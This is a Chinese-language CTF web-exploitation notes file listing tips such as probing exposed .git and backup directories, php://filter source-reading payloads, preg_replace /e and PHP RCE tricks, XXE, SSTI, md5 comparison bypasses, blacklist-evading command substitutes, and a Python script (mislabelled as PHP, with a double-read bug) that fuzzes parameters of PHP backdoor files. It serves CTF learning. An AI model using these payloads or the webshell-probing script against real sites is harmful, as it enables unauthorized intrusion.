# Web技巧

越来越认识到什么是“好记性不如烂笔头”。

1. 当网站没有任何提示时，可以去看看一些敏感目录。

例如：

```
/robots.txt
/.git(这个目录有时候可以直接看，有时候会被forbidden。就算被forbidden了也证明这个目录是存在的，考点可能是git泄露。)
/www.zip（有时候会有网站源码）
```

不过这样蒙目录基本没啥用。建议进一步使用工具扫描目录。不过工具不是万能的，会出现漏扫的情况。尝试把线程调低或者手动检查一些简单的。

2. 永远不要忘记查看源代码以及开发者工具。

很多时候提示都会藏在注释里。还有甚者藏在服务器返回的http报文里，console里。这些都可以用chrome查看。network选项中可以记录报文，如果单纯就是看个报文也没必要专门开个bp。还有最重要的，一些php题包含flag后很有可能包含在注释里，网页直接是看不到的。这时候不看源代码错过flag真的太冤了。

3. 要有bp抓包和改包的习惯。

抓包可以最清楚看到发送了什么东西，接收了什么东西。改包是为了让客户端发出去一些非预期内容，测试能不能触发隐藏bug。

4. flask session伪造

[例题](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/ctfshow/Web/%E6%8A%BD%E8%80%81%E5%A9%86.md)。这题还有个任意文件下载的考点，也很经典。

5. php伪协议

[例题](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/1%E7%BA%A7/Web/fileclude.md)。很多时候用来读取源代码，标志函数为include函数系列。注意php://filter伪协议还可以套另一层协议，不一定非要写`php://filter/read=convert.base64-encode/resource=flag.php`这类的，写`php://filter/read=convert.base64-encode/xxx/resource=flag.php`也行，xxx自定，可用于绕过滤。如[这道题](https://blog.csdn.net/mochu7777777/article/details/105204141)。

6. php preg_replace函数/e选项会导致命令执行

这篇[文章](https://xz.aliyun.com/t/2557)讲的很好。[ics-05](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/3%E7%BA%A7/Web/ics-05.md)是一道关于该漏洞的例题。还有和文章中提到的利用方法思路完全一样的题：[[BJDCTF2020]ZJCTF，不过如此](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5BBJDCTF2020%5DZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4.md)。

7. php rce之<?=和反引号的利用。例题：[RCE挑战1](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/ctfshow/Web/RCE%E6%8C%91%E6%88%981.md)

8. php无字母数字rce之自增利用。例题：[RCE挑战2](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/ctfshow/Web/RCE%E6%8C%91%E6%88%982.md)
9. xml基本xxe利用。例题：[[NCTF2019]Fake XML cookbook](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5BNCTF2019%5DFake%20XML%20cookbook.md)
10. shell命令执行常见[绕过](https://blog.51cto.com/m0re/3879244)
11. [md5碰撞](https://crypto.stackexchange.com/questions/1434/are-there-two-known-strings-which-have-the-same-md5-hash-value)。这是一些hex编码下内容不同却能产生相同md5值的字符串。
12. 一些在黑名单过滤时可互相交换的命令
- 查看目录
> ls<Br>dir
- 输出文件内容
> cat<br>[sort](https://www.cnblogs.com/51linux/archive/2012/05/23/2515299.html)。sort本是排序命令，但是默认会把执行后的结果输出到终端。<Br>[tail](https://www.runoob.com/linux/linux-comm-tail.html)，默认显示文件尾部的内容。由于flag文件基本不会超过十行，所以作用差不多<br>tac，倒序输出文件内容
13. ssti（模板注入）。这张简单但是经典的表说明当出现ssti时如何测试是什么模板。

![ssti_test](../../CTF/BUUCTF/images/Pasted-1-768x458.png)

模板注入分很多种，慢慢积累。

- [twig](https://xz.aliyun.com/t/10056#toc-13)(php)
- [smarty](https://www.anquanke.com/post/id/272393)(php)

14. [浏览器设置编码](https://blog.csdn.net/jnx1142410525/article/details/55271037)。如果浏览器的编码不对就会出现乱码。
15. php md5相关特性。
- md5原始二进制利用+0e绕过md5弱等于+数组绕过md5强等于：[Easy MD5](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/Easy%20MD5.md)。
- 一个0e开头且其md5值也是0e开头的字符串，可用于弱等于：`0e215962017`
16. php 5 intval特性：[[WUSTCTF2020]朴实无华](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5BWUSTCTF2020%5D%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E.md)
17. githacker基本命令
- githacker --url http://example.com/.git --output-folder ./output

18. 多文件内寻找可用shell脚本。今天遇见一道题，整个网站全是后门文件，然而只有一个是有用的。算是fuzz题的变种，可以用以下多线程脚本找到。

```php
import os
import requests
import re
import threading
import time

print('开始时间： '+ time.asctime(time.localtime(time.time()))) 
s1 = threading.Semaphore(100)
filePath = r"src"
os.chdir(filePath)
requests.adapters.DEFAULT_RETRIES = 5
files = os.listdir(filePath)
session = requests.Session()
session.keep_alive = False
def get_content(file):
    s1.acquire()
    print('tring  '+file+'   '+time.asctime(time.localtime(time.time())))
    with open(file,encoding='utf-8') as f:
        gets = list(re.findall('\$_GET\[\'(.*?)\'\]',f.read()))
        posts = list(re.findall('\$_POST\[\'(.*?)\'\]',f.read()))
    data = {}
    params = {}
    for m in gets:
        params[m] = "echo '123456';"
    for n in posts:
        data[n] = "echo '123456';"
    url = "此处填本地网站地址" +file  #远程的也能post和get到，但是不知道为啥fuzz不出来
    req = session.post(url,data=data,params=params)
    req.close()
    req.encoding = 'utf-8'
    content=req.text
    if '123456' in content:
        flag = 0
        for a in gets:
            req = session.get(url+'?%s='%a+"echo '123456';")
            content =req.text
            req.close()
            if "123456" in content:
                flag = 1
                break
        if flag != 1:
            for b in posts:
                req = session.post(url, data={b:"echo '123456';"})
                content =req.text
                req.close()
                if "123456" in content:
                    break
        if flag == 1:
            params = a
        else:
            params = b
        print('找到了利用文件： ' + file +"  and 找到了利用的参数：%s" %params)
        print('结束时间： '+time.asctime(time.localtime(time.time())))
    s1.release()

for i in files:
    t = threading.Thread(target=get_content,args=(i,))
    t.start()
```

题目及来源：[[强网杯 2019]高明的黑客](https://blog.csdn.net/qq_51684648/article/details/120167176)